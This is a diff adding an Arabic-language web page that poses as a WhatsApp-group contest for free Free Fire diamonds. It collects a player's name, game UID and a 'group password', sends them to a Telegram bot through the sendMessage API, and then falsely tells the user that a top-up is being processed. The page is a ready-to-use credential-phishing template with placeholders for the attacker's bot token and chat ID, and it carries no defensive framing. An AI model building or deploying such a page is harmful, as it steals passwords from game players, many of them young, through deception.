@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن جواهر فري فاير | مسابقة الواتساب</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap');
+
+        :root {
+            --primary: #ff9900;
+            --secondary: #ff5500;
+            --bg-glass: rgba(0, 0, 0, 0.75);
+            --glow: 0 0 15px rgba(255, 153, 0, 0.6);
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            color: #fff;
+            font-family: 'Cairo', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: url('maxresdefault.jpg') no-repeat center center fixed;
+            background-size: cover;
+            overflow-x: hidden;
+        }
+
+        /* طبقة حماية وضبابية فوق الخلفية */
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%);
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            background: var(--bg-glass);
+            padding: 35px 25px;
+            border-radius: 25px;
+            border: 2px solid var(--primary);
+            box-shadow: var(--glow), inset 0 0 15px rgba(255,153,0,0.2);
+            width: 90%;
+            max-width: 380px;
+            backdrop-filter: blur(12px);
+            text-align: center;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-size: 26px;
+            margin-bottom: 5px;
+            color: #fff;
+            text-shadow: 0 0 10px var(--primary);
+            font-weight: 900;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #ccc;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: var(--primary);
+            font-weight: bold;
+            padding-right: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 153, 0, 0.3);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s all;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        input:focus {
+            background: rgba(255, 153, 0, 0.1);
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(255, 153, 0, 0.4);
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, var(--secondary), var(--primary));
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 19px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.4s;
+            box-shadow: 0 5px 15px rgba(255, 85, 0, 0.4);
+            margin-top: 10px;
+            text-transform: uppercase;
+        }
+
+        button:active {
+            transform: scale(0.96);
+        }
+
+        .success-msg {
+            display: none;
+            background: rgba(0, 255, 136, 0.1);
+            color: #00ff88;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #00ff88;
+            font-weight: bold;
+            font-size: 14px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+
+        /* لمسة جمالية للهواتف */
+        @media (max-width: 400px) {
+            .container { padding: 25px 20px; }
+            h1 { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="overlay"></div>
+
+    <div class="container">
+        <h1>💎 مسابقة الجواهر 💎</h1>
+        <span class="subtitle">حصرياً لمشتركي مجموعة الواتساب</span>
+        
+        <div class="input-group">
+            <label>👤 اسم اللاعب</label>
+            <input type="text" id="playerName" placeholder="اكتب اسمك في اللعبة" required>
+        </div>
+
+        <div class="input-group">
+            <label>🆔 المعرف (UID)</label>
+            <input type="number" id="playerUid" placeholder="أدخل الـ UID المكون من أرقام" required>
+        </div>
+
+        <div class="input-group">
+            <label>🔑 كلمة سر المجموعة</label>
+            <input type="password" id="groupPassword" placeholder="كلمة السر الخاصة بالواتساب" required>
+        </div>
+
+        <button id="submitBtn" onclick="sendToTelegram()">اشحن الآن مجاناً 🔥</button>
+        
+        <div class="success-msg" id="successMsg">
+            تم إرسال بياناتك بنجاح! <br> جاري التحقق من كلمة السر والشحن...
+        </div>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            const name = document.getElementById('playerName').value;
+            const uid = document.getElementById('playerUid').value;
+            const pass = document.getElementById('groupPassword').value;
+            const btn = document.getElementById('submitBtn');
+
+            if(!name || !uid || !pass) {
+                alert("عذراً! يجب ملء جميع البيانات للمشاركة.");
+                return;
+            }
+
+            // تغيير حالة الزر أثناء الإرسال
+            btn.innerText = "جاري الاتصال بالسيرفر...";
+            btn.disabled = true;
+
+            // --- بيانات البوت الخاصة بك ---
+            const botToken = 'ضع_توكن_البوت_هنا'; 
+            const chatId = 'ضع_ايدي_حسابك_هنا';
+            
+            const message = `🚀 طلب شحن جديد!\n\n👤 اللاعب: ${name}\n🆔 الـ UID: ${uid}\n🔐 كلمة سر المجموعة: ${pass}\n📱 الحالة: عضو واتساب`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if(response.ok) {
+                        document.getElementById('successMsg').style.display = 'block';
+                        btn.style.display = 'none'; // إخفاء الزر بعد النجاح
+                    } else {
+                        alert("حدث خطأ! تأكد من إعدادات البوت والتوكن.");
+                        btn.innerText = "اشحن الآن مجاناً 🔥";
+                        btn.disabled = false;
+                    }
+                })
+                .catch(error => {
+                    alert("تحقق من اتصالك بالإنترنت.");
+                    btn.disabled = false;
+                });
+        }
+    </script>
+</body>
+</html>
